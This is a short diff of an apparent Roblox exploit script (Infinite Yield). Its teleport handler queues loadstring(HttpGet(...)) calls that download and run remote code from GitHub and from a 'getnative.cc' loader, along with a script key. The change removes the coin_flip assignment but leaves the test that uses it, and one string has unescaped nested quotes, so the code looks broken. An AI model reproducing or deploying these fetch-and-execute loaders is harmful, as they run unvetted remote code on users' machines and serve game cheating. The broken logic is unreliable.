@@ -6357,8 +6357,7 @@ Players.LocalPlayer.OnTeleport:Connect(function(State)
 		TeleportCheck = true
 		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
 		end
-		coin_flip = math.random(0, 1)
-		if coin_flip==0 then
+	if coin_flip==0 then
 		sript_key = thescriptkey2;
 		queueteleport("(loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()")
 		else
